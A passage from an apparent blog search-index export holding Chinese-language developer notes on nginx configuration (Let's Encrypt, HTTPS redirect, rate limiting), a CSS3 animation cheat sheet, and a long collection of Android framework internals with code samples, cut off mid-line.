自定义404,5XX的页面也是挺好玩的 nginx查看当前连接数 netstat -n | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a,S[a]}’ nginx上传模块—nginx upload module至于upload，还是直接proxy_pass给一个localhost的http服务吧 nginx添加认证页面 # printf &quot;username:$(openssl passwd -crypt 123456)\\n&quot; &gt;&gt;conf/htpasswd # cat conf/htpasswd ttlsa:xyJkVhXGAZ8tM ELK全家桶实现nginx访问日志可视化，似乎要装java。 关于ngixn返回的response的header中Content-Type，在nginx的config目录下能找到一个mime.types文件。里面指定了哪些文件后缀对应哪些mimetype。比如.mp3文件就返回audio/mpeg这种。 Install Let’s Encrypt to Create SSL Certificateslinode的教程非常实用，基本上就是这几条：注意，该过程需要请求网络，所以事先把nginx关掉，保证80和443端口都是没人在用的 sudo git clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt cd /opt/letsencrypt sudo -H ./letsencrypt-auto certonly --standalone -d example.com -d www.example.com ##多一个二级域名就要多一个-d,就是说得一个个的写，不支持*.example.com这种 sudo ls /etc/letsencrypt/live ##一切顺利的话，生成的证书都在这里了 ./certbot-auto certificates ##看下我当前都有哪些证书 ## 接下来是自动续期环节 sudo -H ./letsencrypt-auto certonly --standalone --renew-by-default -d example.com -d www.example.com ##就是多了renew-by-default这个参数，因为这个免费证书默认是三个月的有效期。 强制http导向https的方法也很多 server { listen 80 default_server; server_name _; return 301 https://$host$request_uri; } 防止cc攻击：nginx http配置： #请求数量控制，每秒20个 limit_req_zone $binary_remote_addr zone=one:10m rate=20r/s; #并发限制30个 limit_conn_zone $binary_remote_addr zone=addr:10m; server块配置 limit_req zone=one burst=5; limit_conn addr 30; 正常的请求log应该长这样111.111.111.111 - - [01/Nov/2017:01:30:30 -0400] “GET /favicon.ico HTTP/2.0” 200 3769 “https://www.baidu.com/“ “Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36” 不正常的请求log长成这样117.111.27.194 - - [01/Nov/2017:02:43:06 -0400] “GET / HTTP/1.1” 301 178 “-“ “-“ ##server-name和user-agent都没有 server { listen 80 default_server; server_name _; //这种可以匹配server-name为空的请求 return 404; access_log off; } 还可以把这种网络扫描的程序导入到受限的服务中 在ubuntu18.04上，logrotate似乎默认已经被安装过了，所以，每天/var/log/nginx里面的文件都会被gzip一遍 有时候会在error.log里面看到这样的话：accept4() failed (24: Too many open files)cat /proc/sys/fs/file-max ##这个值是跟系统内存相关的 用failtoban降低被攻击概率 参考 nginx Configurations How To Install Nginx on Ubuntu 16.04 understanding-the-nginx-configuration-file if is evil, 可以,但不要在config文件里面写if nginx的一些优化策略 rewrite rules怎么写 NGINX LOAD BALANCING – HTTP LOAD BALANCER How to Use NGINX as a Reverse Proxy，不仅是http(s)层的代理，还有其他的protocol也支持 use-nginx-as-a-front-end-proxy-and-software-load-balancer","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"nginx","slug":"nginx","permalink":"https://haldir65.github.io/tags/nginx/"}]},{"title":"css3速查手册","date":"2017-12-09T17:56:06.000Z","path":"2017/12/09/2017-12-09-css3-explained/","text":"一份css3知识汇总 Animation.box{ background: white; width: 200px; height: 200px; position: relative; animation-name: mayanimation; animation-duration: 4s; animation-iteration-count: 1; animation-fill-mode: forwards; /* forwards表示动画完成后，stay as the end of animation */ animation-delay: 2s; animation-direction: alternate; animation-timing-function: ease-out; } @keyframes myanimation { 0% {background-color: white;left:0px;top:0px;border-radius: 0 0 0 0 ;} 25%{background-color: red;left: 300px;top: 0px;border-radius: 50% 0 0 0 } 50%{background-color: green;left: 300px;top: 300px;border-radius: 50% 50% 0 0 } 75%{background-color: blue;left: 0px;top: 300px;border-radius: 50% 50% 50% 0} 100% {background-color: white;left: 0px;top: 0px;border-radius: 50% 50% 50% 50%} } 需要注意的是，如果animation的duration不写的话，是不会生效的 Transition基本就是pseudo selector之间相互变化的时候，在新的状态和原本的状态之间属性变化切换的动画。Transition这个词应该是卡通中使用的，用于显示from state到to state之间的过渡。 .box{ background: white; width: 300px; height: 300px; position: relative; margin: auto; top: 200px; text-align: center; vertical-align: middle; transition-property: all; transition-duration: 1s; transition-timing-function: linear; } .box:hover{ background: red; border-radius: 50%; transform: rotateY(180deg); } 和animation一样，如果transition的duration不写的话，是不会起效的 css-flex-box-guide","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"Android知识集合[三]","date":"2017-12-08T22:33:26.000Z","path":"2017/12/08/2017-12-08-clutter-repo-for-android/","text":"之前的文章快装不下了，所以另外开一篇文章专门放Android相关的杂乱的知识点。 Android Source code，能够实时看到提交信息androidxref，一个比较好的查看源码的网站From View to Pixel讲了ViewRootImpl,SurfaceFlinger这些东西一个很长的关于显示原理的文章，基本上什么都讲了 1.基本上所有的Android System Event都是从ActivityThread中发起的onDetachedFromWindow是从ActivityThread的handleDestoryActivity传下来的，走到windowManager.removeViewImediate,然后ViewRootImpl.doDie,然后ViewRootImpl.dispatchDetachedFromWindow，然后DecoreView.dispatchDetachedFromWindow，然后一个个child传下去。所有的View走完了之后，DecorView在onDetachedFromWindow中以Window.Callback的方式顺手通知了Activity的onDetachedFromWindow。其实打个断点看的话就快一点。 2. onSaveInstance对于有id的View，系统会自动帮忙存一点东西当然onSaveInstance也是从ActivityThread里面传递下来的。还有就是onCreate(Bundle)和onRestroreSaveInstanceState(Bundle)里面的bundle是同一个object。romain Guy说最初onSaveInstance和onRestroreSaveInstanceState本来叫onIcy(冻结)和onThaw（解冻），确实很形象。其实这个到现在还有一些痕迹:ViewGroup.java protected void dispatchFreezeSelfOnly(SparseArray&lt;Parcelable&gt; container) { super.dispatchSaveInstanceState(container); } protected void dispatchThawSelfOnly(SparseArray&lt;Parcelable&gt; container) { super.dispatchRestoreInstanceState(container); } 3.android asset atlas就是为了节省asset耗费的内存，将一些系统公用的资源作为一个服务先跑起来，所有app的process共用这部分资源。 4. ZygoteInit这篇文章讲到了从Launcher点击icon到起一个app的过程，Launcher所在进程通过IPC走startActivity请求位于system_server进程的ActivityManagerService,后者通过socket(Zygote进程跑起来之后就一直在循环等待请求)请求Zygote fork出一个app的进程，接着通知system_server去走Binder IPC去scheduleStartActivity(后面就都是App所在进程了)。 5. Michael Bailey每年的演讲都很精彩Droidcon NYC 2015 - How the Main Thread worksDroidcon NYC 2016 - How LayoutInflater worksdroidcon NYC 2017 - How Espresso Works 2016年的演讲中提到了LayoutInflater中的好玩的注释LayoutInflater.java if (name.equals(TAG_1995)) { // Let&#39;s party like it&#39;s 1995! return new BlinkLayout(context, attrs); } 6. Chris Banes在2017年给出了关于状态栏的解释droidcon NYC 2017 - Becoming a master window fitter 7. Android默认的launcher的repo在Launcher3,应该是属于System UI Team在维护。todo 那个点击了icon进应用的点击事件在哪里。大致是在Launcher.java这个文件的startActivitySafely里面 8. 在string.xml里面放一些format的字符public static void main(String[] args) { String s1 = &quot;这里面可以放多个字符串%1$s,%2$s前面加上一个百分号和数字，代表顺序&quot;; String s2 = &quot;百分号的d和百分号的s可以混着%1$s用的，比如这个%2$d数字什么的，第三个是带百分号的数字%3$d%%这个由于需要显示百分号，所以加上两个百分号&quot;; System.out.println(String.format(s1,&quot;XXXX&quot;,&quot;XXX&quot;)); System.out.println(String.format(s2,&quot;XXX&quot;, 100, 100)); } 实际输出 这里面可以放多个字符串XXXX,XXX前面加上一个百分号和数字，代表顺序百分号的d和百分号的s可以混着XXX用的，比如这个100数字什么的，第三个是带百分号的数字100%这个由于需要显示百分号，所以加上两个百分号 %d represents an integer; you want to use %f for a double. 据猜测d代表decimal而不是double 9.我记得Chet Haase说过Lollipop及以上的Button默认是有一个elevation的记得Chet在一次演讲中说到Appcompat在5.0以上默认使用material Theme, Button的默认elevation好像是3dp。日常开发中也经常会看见button和设置elevation=0的button相比确实有些阴影。在Button的构造函数里面打了断点，在setElevation也打了断点，最后发现是在View创建之后Choregrapher在doFrame的时候run了一个Animation，在这个animation中设置了一个6px的elevation(2dp，原来Chet记错了)。至于这个2dp是那来的呢： &lt;Button ... android:stateListAnimator=&quot;@null&quot; /&gt; &lt;Button ... android:stateListAnimator=&quot;@anim/my_animator&quot; /&gt; 最终在网上找到了core/res/res/anim/button_state_list_anim_material.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;selector xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;item android:state_pressed=&quot;true&quot; android:state_enabled=&quot;true&quot;&gt; &lt;set&gt; &lt;objectAnimator android:propertyName=&quot;translationZ&quot; android:duration=&quot;@integer/button_pressed_animation_duration&quot; 100ms android:valueTo=&quot;@dimen/button_pressed_z_material&quot; ## 4dp 其实稍微注意下，手指按住一个Button的时候，Button底部的阴影会扩大，就是这个4dp的属性动画在跑 android:valueType=&quot;floatType&quot;/&gt; &lt;objectAnimator android:propertyName=&quot;elevation&quot; android:duration=&quot;0&quot; android:valueTo=&quot;@dimen/button_elevation_material&quot; ## 2dp android:valueType=&quot;floatType&quot;/&gt; &lt;/set&gt; &lt;/item&gt; &lt;!-- base state --&gt; &lt;item android:state_enabled=&quot;true&quot;&gt; &lt;set&gt; &lt;objectAnimator android:propertyName=&quot;translationZ&quot; android:duration=&quot;@integer/button_pressed_animation_duration&quot; ##100ms android:valueTo=&quot;0&quot; android:startDelay=&quot;@integer/button_pressed_animation_delay&quot; ## 100ms android:valueType=&quot;floatType&quot;/&gt; &lt;objectAnimator android:propertyName=&quot;elevation&quot; android:duration=&quot;0&quot; android:valueTo=&quot;@dimen/button_elevation_material&quot; ## 2dp android:valueType=&quot;floatType&quot; /&gt; &lt;/set&gt; &lt;/item&gt; &lt;item&gt; &lt;set&gt; &lt;objectAnimator android:propertyName=&quot;translationZ&quot; android:duration=&quot;0&quot; android:valueTo=&quot;0&quot; android:valueType=&quot;floatType&quot;/&gt; &lt;objectAnimator android:propertyName=&quot;elevation&quot; android:duration=&quot;0&quot; android:valueTo=&quot;0&quot; android:valueType=&quot;floatType&quot;/&gt; &lt;/set&gt; &lt;/item&gt; &lt;/selector&gt; 注意那个button_elevation_material：在aosp中 &lt;!-- Elevation when button is pressed --&gt; &lt;dimen name=&quot;button_elevation_material&quot;&gt;2dp&lt;/dimen&gt; &lt;!-- Z translation to apply when button is pressed --&gt; &lt;dimen name=&quot;button_pressed_z_material&quot;&gt;4dp&lt;/dimen&gt; 所以Lollipop上使用Appcompat主题，什么都不改，button默认是会有2dp的elevation的至于这个elevation为什么不是在初始化的时候就设置的（打断点的时候走完构造函数,getElevation还是0），就在于这上面这个AnimationDelay(其实是100ms之后再去运行这个动画)，从堆栈来看，最终导致调用setElevation的地方是在drawableStateChange这个方法里面。 10. 内网传输功能的原理有些App提供局域网内无限传输文件的能力：本质上是用了TCP或者UDP。在java层的话，TCP用的是java.net.Socket，UDP用的是java.net.DatagramSocket。由于数据传输是双向的，客户端和Server端都需要创建这样的Object Instance。一个比较好的DemoUnix的输入输出(IO)系统遵循Open-Read-Write-Close这样的操作范本。 11.v7包里面的Toolbar只是一个自定义View随便举一个例子，右上角的optionMenu点击跳出的弹窗里面其实是一个ListView，具体的class是android.support.v7.view.menu.ListMenuItemView。都是很常规的自定义View的做法，这个ListView的Adapter叫做MenuAdapter，这个Adapter的itemLayout布局文件叫做abc_popup_menu_item_layout.xmlabc_popup_menu_item_layout.xml &lt;android.support.v7.internal.view.menu.ListMenuItemView xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;fill_parent&quot; android:layout_height=&quot;?attr/dropdownListPreferredItemHeight&quot; android:minWidth=&quot;196dip&quot; android:paddingRight=&quot;16dip&quot;&gt; &lt;!-- Icon will be inserted here. --&gt; &lt;!-- The title and summary have some gap between them, and this &#39;group&#39; should be centered vertically. --&gt; &lt;RelativeLayout android:layout_width=&quot;0dip&quot; android:layout_weight=&quot;1&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center_vertical&quot; android:layout_marginLeft=&quot;16dip&quot; android:duplicateParentState=&quot;true&quot;&gt; &lt;TextView android:id=&quot;@+id/title&quot; android:layout_width=&quot;fill_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentTop=&quot;true&quot; android:layout_alignParentLeft=&quot;true&quot; android:textAppearance=&quot;?attr/textAppearanceLargePopupMenu&quot; android:singleLine=&quot;true&quot; android:duplicateParentState=&quot;true&quot; android:ellipsize=&quot;marquee&quot; android:fadingEdge=&quot;horizontal&quot;/&gt; &lt;TextView android:id=&quot;@+id/shortcut&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_below=&quot;@id/title&quot; android:layout_alignParentLeft=&quot;true&quot; android:textAppearance=&quot;?attr/textAppearanceSmallPopupMenu&quot; android:singleLine=&quot;true&quot; android:duplicateParentState=&quot;true&quot;/&gt; &lt;/RelativeLayout&gt; &lt;!-- Checkbox, and/or radio button will be inserted here. --&gt; &lt;/android.support.v7.internal.view.menu.ListMenuItemView&gt; 一般来讲，MenuItem的字体大小，颜色都是需要在theme中写的。所以照说硬要用findViewById(ViewGroup的findViewTraversal)其实是能找到的。 12. Message.ontain以及相似的场景MotionEvent.ontain()，TouchTarget.ontain(),HoverTarget.ontain()….MotionEvent最多缓存10个，TouchTarget和HoverTarget这些都是在看ViewGroup源码的时候瞅到的，简单点。稍微看下就知道这种obtain,recycle写法的套路。 private static final class TouchTarget { private static final int MAX_RECYCLED = 32; private static final Object sRecycleLock = new Object[0]; private static TouchTarget sRecycleBin; private static int sRecycledCount; public static final int ALL_POINTER_IDS = -1; // all ones // The touched child view. public View child; // The combined bit mask of pointer ids for all pointers captured by the target. public int pointerIdBits; // The next target in the target list. public TouchTarget next; private TouchTarget() { } public static TouchTarget obtain(@NonNull View child, int pointerIdBits) { if (child == null) { throw new IllegalArgumentException(&quot;child must be non-null&quot;); } final TouchTarget target; synchronized (sRecycleLock) { if (sRecycleBin == null) { target = new TouchTarget(); } else { target = sRecycleBin; sRecycleBin = target.next; sRecycledCount--; target.next = null; } } target.child = child; target.pointerIdBits = pointerIdBits; return target; } public void recycle() { if (child == null) { throw new IllegalStateException(&quot;already recycled once&quot;); } synchronized (sRecycleLock) { if (sRecycledCount &lt; MAX_RECYCLED) { next = sRecycleBin; sRecycleBin = this; sRecycledCount += 1; } else { next = null; } child = null; } } } 13. 从点击Launcher到应用启动的过程 借助binder驱动ActivityManagerService.startActivity-&gt; (AMS)…//一系类AMS的调用链和一些与Launcher通过Binder的互相调用过程，此时仍然未创建应用程序的进程。… AMS创建一个新的进程，用来启动一个ActivityThread实例， 即将要启动的Activity就是在这个ActivityThread实例中运行Process.start(“android.app.ActivityThread”,…)-&gt;// 通过zygote机制创建一个新的进程Process.startViaZygote-&gt;调用新进程的main()ActivityThread.main-&gt; Android 应用点击图标到Activity界面显示的过程分析 14. Context是什么ActivityThread.java createBaseContextForActivity{ ContextImpl appContext = ContextImpl.createActivityContext( this, r.packageInfo, r.activityInfo, r.token, displayId, r.overrideConfig); } ContextImpl包含资源信息、对Context的一些函数的实现等。每次创建Activity都会新建一个ContextImpl 15. Dex file explainedThe Dex File Format 16 .PackageParser和Android.manifest文件有关Android APK应用安装原理(1)-解析AndroidManifest原理-. 17. 在Dialog中getContext获取的是ContextThemeWrapperContextThemeWrapper是API 1就有了的，主要是包装一下context，将Context的外部调用添加一些包装。 18. 低版本的xml属性怎么写mylayout.xml &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:elevation=&quot;10dp&quot; /&gt; 这样写的话，Lint肯定会报warning。解决办法，alt+enter，Android studio自动生成一个/layout-v21/maylayout.xml。现在想起来很多项目里v-xx文件夹，其实是这个意思。还有一种写法 style=”?android:attr/borderlessButtonStyle”自己写style也是行的 19. LocalBroadCastManager好像确实是基于handler实现的App内部全局拥有一个LocalBroadCastManager实例，内部持有一个handler，对外暴露功能sendBroadcast。就是往handler里丢一个message MSG_EXEC_PENDING_BROADCASTS，处理这个message就是executePendingBroadcasts。所以默认是在下一个message中处理的。如果想在当前message中就处理掉，还有一个sendBroadcastSync方法，但这会把当前持有的所有待处理消息全部flush掉。sendBroadcast，unregisterReceiver，registerReceiver内部用了synchronize，所以是线程安全的。stackoverflow上也有人指出LocalBrodcatManager不支持ipc.BroadcastReceiver倒是可以的，ContentProvider也是官方支持ipc的组件 20. ViewPager为什么没有那些attrs的可以写在xml里面的属性 Adam Powell在15年的Android Dev summit上说过：this is pre aar gradle age, if we were to do it today , we definitely would add。 看了下aosp的git日志，ViewPager是2011年就有了的。而aar是随着android studio的发布推出的。 jar和aar的区别: jar : JAR 文件就是 Java Archive File，顾名思意，它的应用是与 Java 息息相关的，是 Java 的一种文档格式。只包含了class文件与清单文件 ，不包含资源文件，如图片等所有res中的文件。 aar: aar，AAR（Android Archive）包是一个Android库项目的二进制归档文件,包含一些自己写的控件布局文件以及字体等资源文件(resources或者manifest文件)那么就只能使用*.aar文件。 21. 都知道RelativeLayout会measure两次child，LinearLayout在加weight的时候也会measure两次LinearLayout.javameasureVertical() // We have no limit, so make all weighted views as tall as the largest child. // Children will have already been measured once. if (useLargestChild &amp;&amp; heightMode != MeasureSpec.EXACTLY) { for (int i = 0; i &lt; count; i++) { final View child = getVirtualChildAt(i); // ...... } } 22. gradle wrapper文件的作用understanding-the-gradle-wrapper进一个新目录 gradle wrapper 命令会生成如下目录├─.gradle│ ├─4.4.1│ │ ├─fileChanges│ │ ├─fileHashes│ │ └─taskHistory│ └─buildOutputCleanup└─gradle └─wrapper这里提到了一些点：gradlew.bat是给windows平台用的，gradlew是给unix平台用的。gradle/wrapper/gradle-wrapper.jar 里面装的是Gradle Wrapper的代码gradlew就是一个调用gradle命令的脚本，内部会根据gradle-wrapper.properties里面的distributionUrl下载对应版本的gradle distribution zip文件并解压缩，并只会使用该版本的gradle进行编译 gradlew就是帮忙安装好gradle然后调用gradle其实看一下gradlew文件里面的注释: Gradle start up script for UN*X其实就是一个bash脚本 23. java平台下扫描本地samba服务器用的的一个library叫做import jcifs.smb.SmbFile找到一个实例代码 24.Android平台上js交互的速度也是从别处看到的，说是java调js的效率不高，大概200ms，js调java好一点，大概50ms左右，所以尽量用js调java。 25.在Android平台发起上传图片请求的重点在于掌握http协议（关键词Boundary）自己用express写了一个上传文件的后台，前端请求/post接口即可上传图片看了下chrome里面的network POST /upload/ HTTP/1.1 Host: localhost:3000 Connection: keep-alive Content-Length: 9860 Accept: */* Origin: http://localhost:3000 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryw0ZREBdOiJbbwuAg // 注意这句 DNT: 1 Referer: http://localhost:3000/ Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 ------WebKitFormBoundaryw0ZREBdOiJbbwuAg Content-Disposition: form-data; name=&quot;uploads[]&quot;; filename=&quot;278a516893f31a16feee.jpg&quot; Content-Type: image/jpeg ------WebKitFormBoundaryw0ZREBdOiJbbwuAg-- 那个WebKitFormBoundary是浏览器自动加的，Content-Disposition也是浏览器加的 这里借用鸿洋的代码 private static final String BOUNDARY = &quot;----WebKitFormBoundaryT1HoybnYeFOGFlBR&quot;; public void uploadForm(Map&lt;String, String&gt; params, String fileFormName, File uploadFile, String newFileName, String urlStr) throws IOException { if (newFileName == null || newFileName.trim().equals(&quot;&quot;)) { newFileName = uploadFile.getName(); } StringBuilder sb = new StringBuilder(); /** * 普通的表单数据 */ for (String key : params.keySet()) { sb.append(&quot;--&quot; + BOUNDARY + &quot;\\r\\n&quot;); sb.append(&quot;Content-Disposition: form-data; name=\\&quot;&quot; + key + &quot;\\&quot;&quot; + &quot;\\r\\n&quot;); sb.append(&quot;\\r\\n&quot;); sb.append(params.get(key) + &quot;\\r\\n&quot;); } /** * 上传文件的头 */ sb.append(&quot;--&quot; + BOUNDARY + &quot;\\r\\n&quot;); sb.append(&quot;Content-Disposition: form-data; name=\\&quot;&quot; + fileFormName + &quot;\\&quot;; filename=\\&quot;&quot; + newFileName + &quot;\\&quot;&quot; + &quot;\\r\\n&quot;); sb.append(&quot;Content-Type: image/jpeg&quot; + &quot;\\r\\n&quot;);// 如果服务器端有文件类型的校验，必须明确指定ContentType sb.append(&quot;\\r\\n&quot;); byte[] headerInfo = sb.toString().getBytes(&quot;UTF-8&quot;); byte[] endInfo = (&quot;\\r\\n--&quot; + BOUNDARY + &quot;--\\r\\n&quot;).getBytes(&quot;UTF-8&quot;); System.out.println(sb.toString()); URL url = new URL(urlStr); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod(&quot;POST&quot;); conn.setRequestProperty(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=&quot; + BOUNDARY); conn.setRequestProperty(&quot;Content-Length&quot;, String .valueOf(headerInfo.length + uploadFile.length() + endInfo.length)); conn.setDoOutput(true); OutputStream out = conn.getOutputStream(); InputStream in = new FileInputStream(uploadFile); out.write(headerInfo); byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); out.write(endInfo); in.close(); out.close(); if (conn.getResponseCode() == 200) { System.out.println(&quot;上传成功&quot;); } } 26.ScrollView，RecyclerView的截屏实现主要是用lru包装下，参考 public static Bitmap shotRecyclerView(RecyclerView view) { RecyclerView.Adapter adapter = view.getAdapter(); Bitmap bigBitmap = null; if (adapter != null) { int size = adapter.getItemCount(); int height = 0; Paint paint = new Paint(); int iHeight = 0; final int maxMemory = (int) (Runtime.getRuntime().maxMemory() / 1024); // Use 1/8th of the available memory for this memory cache. final int cacheSize = maxMemory / 8; LruCache&lt;String, Bitmap&gt; bitmaCache = new LruCache&lt;&gt;(cacheSize); for (int i = 0; i &lt; size; i++) { RecyclerView.ViewHolder holder = adapter.createViewHolder(view, adapter.getItemViewType(i)); adapter.onBindViewHolder(holder, i); holder.itemView.measure( View.MeasureSpec.makeMeasureSpec(view.getWidth(), View.MeasureSpec.EXACTLY), View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)); holder.itemView.layout(0, 0, holder.itemView.getMeasuredWidth(), holder.itemView.getMeasuredHeight()); holder.itemView.setDrawingCacheEnabled(true); holder.itemView.buildDrawingCache(); Bitmap drawingCache = holder.itemView.getDrawingCache(); if (drawingCache != null) { bitmaCache.put(String.valueOf(i), drawingCache); } height += holder.itemView.getMeasuredHeight(); } bigBitmap = Bitmap.createBitmap(view.getMeasuredWidth(), height, Bitmap.Config.ARGB_8888); Canvas bigCanvas = new Canvas(bigBitmap); Drawable lBackground = view.getBackground(); if (lBackground instanceof ColorDrawable) { ColorDrawable lColorDrawable = (ColorDrawable) lBackground; int lColor = lColorDrawable.getColor(); bigCanvas.drawColor(lColor); } for (int i = 0; i &lt; size; i++) { Bitmap bitmap = bitmaCache.get(String.valueOf(i)); bigCanvas.drawBitmap(bitmap, 0f, iHeight, paint); iHeight += bitmap.getHeight(); bitmap.recycle(); } } return bigBitmap; } // 截取listView也是差不多，主要是一个makeMeasureSpec View.MeasureSpec.UNSPECIFIED public static Bitmap shotListView(ListView listview) { ListAdapter adapter = listview.getAdapter(); int itemscount = adapter.getCount(); int allitemsheight = 0; List&lt;Bitmap&gt; bmps = new ArrayList&lt;Bitmap&gt;(); for (int i = 0; i &lt; itemscount; i++) { View childView = adapter.getView(i, null, listview); childView.measure( View.MeasureSpec.makeMeasureSpec(listview.getWidth(), View.MeasureSpec.EXACTLY), View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)); childView.layout(0, 0, childView.getMeasuredWidth(), childView.getMeasuredHeight()); childView.setDrawingCacheEnabled(true); childView.buildDrawingCache(); bmps.add(childView.getDrawingCache()); allitemsheight += childView.getMeasuredHeight(); } Bitmap bigbitmap = Bitmap.createBitmap(listview.getMeasuredWidth(), allitemsheight, Bitmap.Config.ARGB_8888); Canvas bigcanvas = new Canvas(bigbitmap); Paint paint = new Paint(); int iHeight = 0; for (int i = 0; i &lt; bmps.size(); i++) { Bitmap bmp = bmps.get(i); bigcanvas.drawBitmap(bmp, 0, iHeight, paint); iHeight += bmp.getHeight(); bmp.recycle(); bmp = null; } return bigbitmap; } 都在这里了 27.正常使用Android WebView的方法大概这样mWebView = findViewById(R.id.my_webview) mWebView.getSettings().setJavaScriptEnabled(true) //这只是enable js mWebView.setWebViewClient(WebViewClient()) //没有这句LayoutInflater调用newInstance的时候就崩了 mWebView.loadUrl(&quot;https://www.baidu.com&quot;) 对于Android调用JS代码的方法有2种：[Android：你要的WebView与 JS 交互方式 都在这里了(https://blog.csdn.net/carson_ho/article/details/64904691) 通过WebView的loadUrl（） 通过WebView的evaluateJavascript（） // 4.4以上可用，效率高一点 对于JS调用Android代码的方法有3种： 通过WebView的addJavascriptInterface（）进行对象映射 通过 WebViewClient 的shouldOverrideUrlLoading ()方法回调拦截 url 通过 WebChromeClient 的onJsAlert()、onJsConfirm()、onJsPrompt（）方法回调拦截JS对话框alert()、confirm()、prompt（） 消息 然后是WebView的截屏 private fun screenShot() { //这种方式只能截出来当前屏幕上显示的内容，状态栏以下，手机屏幕底部以上的内容，仅此而已 val screenWidth :Float = Utils.getScreenWidth(this).toFloat() val screenHeight = Utils.getScreenHeight(this).toFloat() val shortImage = Bitmap.createBitmap(screenWidth.toInt(), screenHeight.toInt(), Bitmap.Config.RGB_565) val canvas = Canvas(shortImage) // 画布的宽高和屏幕的宽高保持一致 val paint = Paint() canvas.drawBitmap(shortImage, screenWidth, screenHeight, paint) mWebView.draw(canvas) savebitmap(&quot;1_awesome&quot;,shortImage) } // 然而下面这种方式截出来的长度是对了，但底部是空的，得到的是一张很长的，但除了顶部有当前屏幕显示内容以外底部空白的图片 //就是只能截下来可视区域 private fun screenShotLong(){ mWebView.measure(View.MeasureSpec.makeMeasureSpec(View.MeasureSpec.UNSPECIFIED, View.MeasureSpec.UNSPECIFIED), View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)) mWebView.layout(0,0,mWebView.measuredWidth,mWebView.measuredHeight) mWebView.isDrawingCacheEnabled = true mWebView.buildDrawingCache() //图片大的话，这段也卡很长时间 val longBitmap = Bitmap.createBitmap(mWebView.measuredWidth,mWebView.measuredHeight,Bitmap.Config.ARGB_8888) val canvas = Canvas(longBitmap) val paint = Paint() canvas.drawBitmap(longBitmap,0f,mWebView.measuredHeight.toFloat(),paint) mWebView.draw(canvas) savebitmap(&quot;longbitmap&quot;,longBitmap) ToastUtil.showTextLong(this,&quot;All done!&quot;) } //然后找了下，只要在setContentView前，调用这个方法就ok了。但这个方法得在App中所有WebView创建前调用 if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) { WebView.enableSlowWholeDocumentDraw(); } setContentView(R.layout.activity_webview); // 然而看到了这样的日志 // View: WebView not displayed because it is too large to fit into a software layer (or drawing cache), needs 20710080 bytes, only 8294400 available //保存下来的png大小正好普遍在MB量级，另外，保存图片期间完全卡顿（把createBitmap和saveBitmap这段挪到子线程好点了，cpu占用25%以上持续10s，内存占用从32MB飙到400MB，一直不下来了） 还有,js调java的时候，走的是java的一个叫做JavaBridge的线程，操作UI的话post就好了。 28. 分析一点ViewPager的源码首先是快速滑动的时候为了性能只是挪了bitmap，这比调用layout要快得多。ViewPager.java private void setScrollingCacheEnabled(boolean enabled) { if (mScrollingCacheEnabled != enabled) { mScrollingCacheEnabled = enabled; if (USE_CACHE) { //这个一直是false final int size = getChildCount(); for (int i = 0; i &lt; size; ++i) { final View child = getChildAt(i); if (child.getVisibility() != GONE) { child.setDrawingCacheEnabled(enabled); } } } } } // 这里要说的是，PagerAdapter中可以复写的方法很多，比如一些状态的保存就可以写在adapter中 @Override public Parcelable onSaveInstanceState() { Parcelable superState = super.onSaveInstanceState(); SavedState ss = new SavedState(superState); ss.position = mCurItem; if (mAdapter != null) { ss.adapterState = mAdapter.saveState(); } return ss; } ViewPager的 onMeasure中有这么一段话,这也就解释了为什么viewPager宽高不能设置为wrap_content。 @Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { // For simple implementation, our internal size is always 0. // We depend on the container to specify the layout size of // our view. We can&#39;t really know what it is since we will be // adding and removing different arbitrary views and do not // want the layout to change as this happens. setMeasuredDimension(getDefaultSize(0, widthMeasureSpec), getDefaultSize(0, heightMeasureSpec)); // ................................ } ViewPager横向挪动child的方法是ViewPager.java @Override public boolean onInterceptTouchEvent(MotionEvent ev) { /* * This method JUST determines whether we want to intercept the motion. * If we return true, onMotionEvent will be called and we do the actual * scrolling there. */ // 这里只是做一个拦截，真正去挪动child的方法在onTouchEvent里面 } // Not else! Note that mIsBeingDragged can be set above. if (mIsBeingDragged) { // Scroll to follow the motion event final int activePointerIndex = ev.findPointerIndex(mActivePointerId); final float x = ev.getX(activePointerIndex); needsInvalidate |= performDrag(x); } private boolean performDrag(float x) { boolean needsInvalidate = false; scrollTo((int) scrollX, getScrollY()); //其实是ViewPager自己在滑动 pageScrolled((int) scrollX); //pageScrollView中并未涉及child的挪动 return needsInvalidate; } // 因为在onLayout中是这么写的，所以后面的child其实已经被layout到屏幕右边排队了，手指往左滑动的时候带着ViewPager，相当于直接把右边的children拽出来了。 child.layout(childLeft, childTop, childLeft + child.getMeasuredWidth(), childTop + child.getMeasuredHeight()); // offsetLeftAndRight底层的实现是修改displayList的数据，native方法 mLeft += 